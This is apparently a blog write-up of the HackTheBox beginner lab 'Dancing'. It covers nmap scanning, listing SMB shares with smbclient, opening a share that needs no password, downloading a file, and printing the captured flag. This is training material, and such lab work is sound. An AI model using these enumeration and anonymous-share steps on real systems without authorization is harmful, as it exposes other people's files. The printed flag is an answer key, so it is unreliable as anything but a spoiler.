---
title: "[CTF] HackTheBox - Dancing (Basics)"
date: 2024-09-14 13:00:00 -500 
categories: [CTF - HackTheBox, Dancing (Basics)]
tags: [ctf,exploit,flags,htb,hackthebox]
author: Christoph K
---


Tasks:

- Connect
- Task 1:  What does the 3-letter acronym SMB stand for?
- Task 2:  What port does SMB use to operate at?
- Task 3:  What is the service name for port 445 that came up in our Nmap scan?
- Task 4:  What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
- Task 5:  How many shares are there on Dancing?
- Task 6:  What is the name of the share we are able to access in the end with a blank password?
- Task 7:  What is the command we can use within the SMB shell to download the files we find?
- Task 8:  Submit root flag



### Connect

I always use `openvpn` because it is very easy to connect to the network where the target maschine is.

Just download the `.ovpn` file and type:
 
`sudo openvpn yourfile.ovpn`


**Alternative** :
Use the Pwnbox, which is a preconfigured, browser-based virtual maschine. 

### - Task 1:  What does the 3-letter acronym SMB stand for?

SMB stands for ` Server Message Block`


Answer: ` Server Message Block`



### Task 2:  What port does SMB use to operate at?

Lets use nmap again and find it out.

```bash

nmap 10.129.122.235 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 16:35 CST
Nmap scan report for 10.129.122.235
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Answer: `445`



### Task 3:  What is the service name for port 445 that came up in our Nmap scan?

In our nmap scan earlier we can see `microsoft-ds` as service name.

Answer: `microsoft-ds`

### Task 4:  What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

After checking the `man smbclient` we can list with `--list ` or `-L`.
```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ smbclient -L $ip
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```
Answer: `-L `



### Task 5:  How many shares are there on Dancing?

There are 4 shares:
```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ smbclient -L $ip
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

Anser: `4`

### Task 6:  What is the name of the share we are able to access in the end with a blank password?

The only one without a `$`sign is a custom share.

After trying to connect to the other shares, `WorkShares`didnt need a password.
```shell
┌──(admin㉿PREDATOR-01)-[~]
└─$ smbclient \\\\$ip\\WorkShares
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \>
```



Answer: `WorkShares`

### Task 7:  What is the command we can use within the SMB shell to download the files we find?

With `man smbclient` we check the manual of that command.

```bash


       get <remote file name> [local file name]
           Copy the file called remote file name from the server to the machine running the client. If specified, name
           the local copy local file name. Note that all transfers in smbclient are binary. See also the lowercase
           command.
```


Seems like `get` like in ftp sessions.

Answer: `get`


### Task 8: Submit root flag

Connect to the share and search for the flag:

```bash

└─$ smbclient \\\\$ip\\WorkShares
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> get
get <filename> [localname]
smb: \> ls
  .                                   D        0  Mon Mar 29 16:22:01 2021
  ..                                  D        0  Mon Mar 29 16:22:01 2021
  Amy.J                               D        0  Mon Mar 29 17:08:24 2021
  James.P                             D        0  Thu Jun  3 16:38:03 2021

                5114111 blocks of size 4096. 1750460 blocks available
smb: \> cd .
smb: \> cd ..
smb: \> ls
  .                                   D        0  Mon Mar 29 16:22:01 2021
  ..                                  D        0  Mon Mar 29 16:22:01 2021
  Amy.J                               D        0  Mon Mar 29 17:08:24 2021
  James.P                             D        0  Thu Jun  3 16:38:03 2021
c
                5114111 blocks of size 4096. 1750460 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 17:08:24 2021
  ..                                  D        0  Mon Mar 29 17:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 19:00:37 2021

                5114111 blocks of size 4096. 1750460 blocks available
smb: \Amy.J\> cd ..
smb: \> cd James.P\
ls
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 16:38:03 2021
  ..                                  D        0  Thu Jun  3 16:38:03 2021
  flag.txt                            A       32  Mon Mar 29 17:26:57 2021

                5114111 blocks of size 4096. 1750460 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \James.P\> exit

┌──(admin㉿PREDATOR-01)-[~]
└─$ ls
bruteforce.sh  Desktop    Downloads  Music     Public  script.sh  value.txt  writeup-twomillion.md
decrypt.txt    Documents  flag.txt   Pictures  rick    Templates  Videos

┌──(admin㉿PREDATOR-01)-[~]
└─$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
┌──(admin㉿PREDATOR-01)-[~]
└─$

```


Answer: `5f61c10dffbc77a704d76016a22f1664`